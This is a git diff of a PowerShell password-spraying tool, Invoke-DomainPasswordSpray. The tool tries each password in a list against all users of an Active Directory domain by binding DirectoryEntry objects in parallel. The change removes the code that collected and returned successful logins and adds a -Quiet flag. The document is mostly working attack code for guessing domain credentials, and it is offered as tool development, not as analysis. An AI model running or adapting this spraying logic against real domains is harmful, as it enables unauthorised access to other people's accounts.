@@ -114,7 +114,6 @@ function Invoke-DomainPasswordSpray {
 	Write-Host -ForegroundColor Yellow "[*] Password spraying has begun against $($UserList.count) users on the $DomainName domain. Current time is $($StartTime.ToShortTimeString())"
 	
 	$CurrentPasswordIndex = 0
-	$SuccessfulResults = New-Object System.Collections.ArrayList
 	
 	foreach ($Password in $PasswordList) {
 		
@@ -122,7 +121,7 @@ function Invoke-DomainPasswordSpray {
 		
 		Write-Host "[*] Trying Password $($CurrentPasswordIndex+1) of $($PasswordList.count): $Password"	
 		
-		$results = $UserList | Invoke-Parallel -ImportVariables -Throttle 50 -ScriptBlock {
+		$UserList | Invoke-Parallel -ImportVariables -Throttle 50 -Quiet -ScriptBlock {
 			
 			
 			$TestDomain = New-Object System.DirectoryServices.DirectoryEntry($Using:CurrentDomain, $_, $Using:Password)
@@ -143,11 +142,9 @@ function Invoke-DomainPasswordSpray {
 
 		}
 		
-		$SuccessfulResults.Add($results) > $null
-		
 		$PasswordEndTime = Get-Date
 		$PasswordElapsedTime = New-Timespan –Start $PasswordStartTime –End $PasswordEndTime
-		Write-Host "[*] Finished trying password $Password at $($PasswordEndTime.ToShortTimeString()) - $($results.count) successful results"
+		Write-Host "[*] Finished trying password $Password at $($PasswordEndTime.ToShortTimeString())"
 		Write-Host $("[*] Total time elapsed trying $Password was {0:hh} hours, {0:mm} minutes, and {0:ss} seconds" -f $PasswordElapsedTime)
 
 		$CurrentPasswordIndex++
@@ -162,7 +159,5 @@ function Invoke-DomainPasswordSpray {
 	$ElapsedTime = New-Timespan –Start $StartTime –End $EndTime
 	Write-Host -ForegroundColor Yellow "[*] Password spraying is complete at $($EndTime.ToShortTimeString())"
 	Write-Host $("[*] Overall runtime was {0:hh} hours, {0:mm} minutes, and {0:ss} seconds" -f $ElapsedTime)
-	
-	$SuccessfulResults
 	
 }
